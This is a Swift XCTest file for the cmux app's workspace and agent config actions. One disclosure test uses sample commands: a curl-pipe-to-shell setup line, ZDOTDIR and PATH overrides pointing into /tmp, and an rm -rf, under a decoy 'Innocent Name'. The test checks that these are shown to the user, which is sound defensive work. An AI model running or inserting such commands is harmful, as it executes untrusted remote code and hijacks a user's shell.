import XCTest

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

final class CmuxConfigWorkspaceActionTests: XCTestCase {
    private func decode(_ json: String) throws -> CmuxConfigFile {
        try JSONDecoder().decode(CmuxConfigFile.self, from: Data(json.utf8))
    }

    private func workspaceAction(
        in config: CmuxConfigFile,
        id: String
    ) throws -> (definition: CmuxWorkspaceDefinition, restart: CmuxRestartBehavior?) {
        let action = try XCTUnwrap(config.actions[id]?.action)
        return try XCTUnwrap(action.inlineWorkspace)
    }

    // MARK: - Decoding workspace actions

    func testDecodeWorkspaceActionWithExplicitType() throws {
        let config = try decode("""
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "restart": "recreate",
              "newWorkspaceMenu": true,
              "workspace": {
                "name": "Dev",
                "cwd": "~/code/app",
                "setup": "  git fetch --all  ",
                "layout": {
                  "direction": "horizontal",
                  "split": 0.4,
                  "children": [
                    { "pane": { "surfaces": [ { "type": "terminal", "command": "claude", "focus": true } ] } },
                    { "pane": { "surfaces": [ { "type": "browser", "url": "https://example.com" } ] } }
                  ]
                }
              }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "dev-setup")
        XCTAssertEqual(inline.definition.name, "Dev")
        XCTAssertEqual(inline.definition.cwd, "~/code/app")
        XCTAssertEqual(inline.definition.setup, "git fetch --all")
        XCTAssertEqual(inline.restart, .recreate)
        XCTAssertEqual(config.actions["dev-setup"]?.newWorkspaceMenu, true)
        guard case .split(let split)? = inline.definition.layout else {
            return XCTFail("Expected split layout")
        }
        XCTAssertEqual(split.direction, .horizontal)
        XCTAssertEqual(split.children.count, 2)
    }

    func testDecodeWorkspaceActionInferredFromWorkspaceKey() throws {
        let config = try decode("""
        {
          "actions": {
            "quick": {
              "title": "Quick",
              "workspace": { "name": "Quick" }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "quick")
        XCTAssertEqual(inline.definition.name, "Quick")
        XCTAssertNil(inline.restart)
    }

    func testWorkspaceActionRequiresWorkspaceObject() {
        XCTAssertThrowsError(try decode("""
        {
          "actions": {
            "broken": { "type": "workspace", "title": "Broken" }
          }
        }
        """))
    }

    func testWorkspaceActionEncodeDecodeRoundTrip() throws {
        let definition = CmuxWorkspaceDefinition(
            name: "Round Trip",
            cwd: "~/code",
            env: ["FOO": "bar"],
            setup: "make deps",
            layout: .split(CmuxSplitDefinition(
                direction: .vertical,
                split: 0.3,
                children: [
                    .pane(CmuxPaneDefinition(surfaces: [
                        CmuxSurfaceDefinition(type: .terminal, name: "Agent", command: "opencode", focus: true)
                    ])),
                    .pane(CmuxPaneDefinition(surfaces: [
                        CmuxSurfaceDefinition(type: .browser, url: "https://example.com")
                    ])),
                ]
            ))
        )
        let original = CmuxConfigActionDefinition(
            action: .workspace(definition, restart: .confirm),
            title: "Round Trip",
            newWorkspaceMenu: false
        )
        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(CmuxConfigActionDefinition.self, from: data)
        XCTAssertEqual(decoded, original)
    }

    func testDecodeBlankSetupBecomesNil() throws {
        let config = try decode("""
        {
          "actions": {
            "blank-setup": { "workspace": { "name": "X", "setup": "   " } }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "blank-setup")
        XCTAssertNil(inline.definition.setup)
    }

    // MARK: - Agent kinds

    func testDecodeKnownAndCustomAgents() throws {
        let config = try decode("""
        {
          "actions": {
            "oc": { "type": "agent", "agent": "opencode" },
            "custom": { "type": "agent", "agent": "aider", "args": "--model gpt" }
          }
        }
        """)
        guard case .agent(let ocKind, _)? = config.actions["oc"]?.action else {
            return XCTFail("Expected agent action")
        }
        XCTAssertEqual(ocKind, .opencode)
        XCTAssertEqual(ocKind.commandName, "opencode")

        guard case .agent(let customKind, let args)? = config.actions["custom"]?.action else {
            return XCTFail("Expected agent action")
        }
        XCTAssertEqual(customKind, .custom("aider"))
        XCTAssertEqual(customKind.commandName, "aider")
        XCTAssertEqual(args, "--model gpt")
        XCTAssertEqual(config.actions["custom"]?.action?.terminalCommand, "aider --model gpt")
    }

    func testCustomAgentRejectsWhitespaceNames() {
        XCTAssertThrowsError(try decode("""
        {
          "actions": {
            "bad": { "type": "agent", "agent": "aider --yolo" }
          }
        }
        """))
    }

    func testAgentEncodeRoundTrip() throws {
        for kind in [CmuxConfigAgentKind.codex, .claudeCode, .opencode, .custom("goose")] {
            let data = try JSONEncoder().encode(kind)
            let decoded = try JSONDecoder().decode(CmuxConfigAgentKind.self, from: data)
            XCTAssertEqual(decoded, kind)
        }
    }

    // MARK: - Resolved action defaults

    func testWantsNewWorkspaceMenuDefaults() throws {
        let workspaceAction = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "ws",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "W"), restart: nil)
            ),
            sourcePath: nil
        ))
        XCTAssertTrue(workspaceAction.wantsNewWorkspaceMenu)

        let commandAction = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "cmd",
            definition: CmuxConfigActionDefinition(action: .command("make")),
            sourcePath: nil
        ))
        XCTAssertFalse(commandAction.wantsNewWorkspaceMenu)

        let optedOut = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "ws2",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "W2"), restart: nil),
                newWorkspaceMenu: false
            ),
            sourcePath: nil
        ))
        XCTAssertFalse(optedOut.wantsNewWorkspaceMenu)

        let optedIn = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "cmd2",
            definition: CmuxConfigActionDefinition(
                action: .command("make"),
                newWorkspaceMenu: true
            ),
            sourcePath: nil
        ))
        XCTAssertTrue(optedIn.wantsNewWorkspaceMenu)
    }

    // MARK: - Store: plus-button menu auto-append

    @MainActor
    private func loadStore(globalJSON: String) throws -> CmuxConfigStore {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
            "cmux-workspace-action-tests-\(UUID().uuidString)",
            isDirectory: true
        )
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        addTeardownBlock {
            try? FileManager.default.removeItem(at: root)
        }
        let globalConfigURL = root.appendingPathComponent("cmux.json")
        try globalJSON.write(to: globalConfigURL, atomically: true, encoding: .utf8)
        let store = CmuxConfigStore(
            globalConfigPath: globalConfigURL.path,
            localConfigPath: nil,
            startFileWatchers: false
        )
        store.loadAll()
        return store
    }

    @MainActor
    private func menuActionIDs(_ store: CmuxConfigStore) -> [String] {
        store.newWorkspaceContextMenuItems.compactMap { item in
            if case .action(let menuAction) = item {
                return menuAction.action.id
            }
            return nil
        }
    }

    @MainActor
    func testStoreAutoAppendsWorkspaceActionsToPlusButtonMenu() throws {
        let store = try loadStore(globalJSON: """
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "workspace": { "name": "Dev" }
            }
          }
        }
        """)
        let ids = menuActionIDs(store)
        XCTAssertTrue(ids.contains("dev-setup"), "workspace action should be auto-offered, got \(ids)")
        // Defaults stay first.
        XCTAssertEqual(ids.first, CmuxSurfaceTabBarBuiltInAction.newWorkspace.configID)
        // Auto block is separated from the configured items.
        if case .separator? = store.newWorkspaceContextMenuItems.dropLast().last {} else {
            XCTFail("Expected separator before auto-appended actions")
        }
    }

    @MainActor
    func testStoreRespectsNewWorkspaceMenuOptOut() throws {
        let store = try loadStore(globalJSON: """
        {
          "actions": {
            "hidden": {
              "type": "workspace",
              "title": "Hidden",
              "newWorkspaceMenu": false,
              "workspace": { "name": "Hidden" }
            },
            "shown-command": {
              "type": "command",
              "title": "Shown",
              "command": "make",
              "newWorkspaceMenu": true
            }
          }
        }
        """)
        let ids = menuActionIDs(store)
        XCTAssertFalse(ids.contains("hidden"))
        XCTAssertTrue(ids.contains("shown-command"))
    }

    @MainActor
    func testStoreDoesNotDuplicateExplicitMenuEntries() throws {
        let store = try loadStore(globalJSON: """
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "workspace": { "name": "Dev" }
            }
          },
          "ui": {
            "newWorkspace": {
              "contextMenu": ["dev-setup"]
            }
          }
        }
        """)
        let ids = menuActionIDs(store)
        XCTAssertEqual(ids.filter { $0 == "dev-setup" }.count, 1)
    }

    // MARK: - Executor

    func testInlineWorkspaceSyntheticCommandCarriesConfirm() throws {
        let action = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "confirm-me",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "C"), restart: .ignore),
                title: "Confirm Me",
                confirm: true
            ),
            sourcePath: nil
        ))
        let syntheticCommand = try XCTUnwrap(action.inlineWorkspaceSyntheticCommand)
        XCTAssertEqual(syntheticCommand.confirm, true)
        XCTAssertEqual(syntheticCommand.restart, .ignore)
        XCTAssertEqual(syntheticCommand.workspace?.name, "C")

        let button = CmuxSurfaceTabBarButton(
            id: "confirm-button",
            title: "Confirm Button",
            action: .workspace(CmuxWorkspaceDefinition(name: "B"), restart: nil),
            confirm: true
        )
        XCTAssertEqual(button.inlineWorkspaceSyntheticCommand?.confirm, true)
    }

    @MainActor
    func testWorkspaceShellDisclosureListsSetupCommandsAndEnv() {
        let command = CmuxCommandDefinition(
            name: "Innocent Name",
            workspace: CmuxWorkspaceDefinition(
                name: "W",
                env: ["ZDOTDIR": "/tmp/evil"],
                setup: "curl example.com/install.sh | sh",
                layout: .split(CmuxSplitDefinition(
                    direction: .horizontal,
                    split: 0.5,
                    children: [
                        .pane(CmuxPaneDefinition(surfaces: [
                            CmuxSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
                        ])),
                        .pane(CmuxPaneDefinition(surfaces: [
                            CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch"),
                        ])),
                    ]
                ))
            )
        )

        let disclosure = CmuxConfigExecutor.workspaceShellDisclosure(command)
        XCTAssertTrue(disclosure.hasPrefix("Innocent Name"))
        XCTAssertTrue(disclosure.contains("curl example.com/install.sh | sh"))
        XCTAssertTrue(disclosure.contains("claude"))
        XCTAssertTrue(disclosure.contains("rm -rf ./scratch"))
        // Env assignments change what executes; they must be disclosed too.
        XCTAssertTrue(disclosure.contains("ZDOTDIR=/tmp/evil"))
        XCTAssertTrue(disclosure.contains("PATH=/tmp/bin"))

        let plain = CmuxCommandDefinition(
            name: "Plain",
            workspace: CmuxWorkspaceDefinition(name: "P")
        )
        XCTAssertEqual(CmuxConfigExecutor.workspaceShellDisclosure(plain), "Plain")
    }

    @MainActor
    func testInlineWorkspaceActionCreatesWorkspace() throws {
        let manager = TabManager()
        let action = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Dev Setup"), restart: nil),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        XCTAssertTrue(CmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/cmux-test-global-config.json"
        ))

        XCTAssertEqual(manager.tabs.count, 2)
        XCTAssertEqual(manager.selectedWorkspace?.customTitle, "Dev Setup")
    }

    @MainActor
    func testInlineWorkspaceSurfaceTabBarButtonExecutesOnClick() throws {
        let manager = TabManager()
        let workspace = try XCTUnwrap(manager.tabs.first)
        let button = CmuxSurfaceTabBarButton(
            id: "review-setup",
            title: "Review Setup",
            action: .workspace(CmuxWorkspaceDefinition(name: "Review"), restart: nil)
        )
        workspace.applySurfaceTabBarButtons(
            [button],
            sourcePath: nil,
            globalConfigPath: "/tmp/cmux-test-global-config.json",
            terminalCommandSourcePaths: [:],
            workspaceCommands: [:]
        )

        let pane = try XCTUnwrap(workspace.bonsplitController.allPaneIds.first)
        workspace.splitTabBar(
            workspace.bonsplitController,
            didRequestCustomAction: "review-setup",
            inPane: pane
        )

        XCTAssertEqual(manager.tabs.count, 2, "inline workspace button click should create the workspace")
        XCTAssertEqual(manager.selectedWorkspace?.customTitle, "Review")
    }

    @MainActor
    func testInlineWorkspaceActionHonorsIgnoreRestart() throws {
        let manager = TabManager()
        let existingWorkspace = manager.tabs[0]
        existingWorkspace.setCustomTitle("Dev Setup")

        let action = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Dev Setup"), restart: .ignore),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        XCTAssertTrue(CmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/cmux-test-global-config.json"
        ))

        XCTAssertEqual(manager.tabs.map(\.id), [existingWorkspace.id])
        XCTAssertEqual(manager.selectedWorkspace?.id, existingWorkspace.id)
    }
}
